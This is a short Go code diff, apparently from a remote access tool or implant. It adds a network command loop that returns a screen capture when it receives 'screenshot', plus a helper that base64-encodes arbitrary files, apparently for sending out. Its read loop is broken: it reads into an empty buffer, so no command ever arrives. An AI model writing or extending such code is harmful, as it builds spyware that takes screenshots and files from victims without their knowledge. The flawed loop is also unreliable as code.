@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	b64 "encoding/base64"
 	"fmt"
 	"image/png"
 	"net"
@@ -96,8 +97,16 @@ func engage_via(conn net.Conn) {
 	for {
 		var cmd string
 		conn.Read([]byte(cmd))
-		fmt.Println(cmd)
+		if cmd == "screenshot" {
+			result := screen_capture()
+			conn.Write([]byte(result))
+		}
 	}
+}
+
+func b64_file(file string) string {
+	content, _ := os.ReadFile(file)
+	return b64.StdEncoding.EncodeToString(content)
 }
 
 func screen_capture() string {
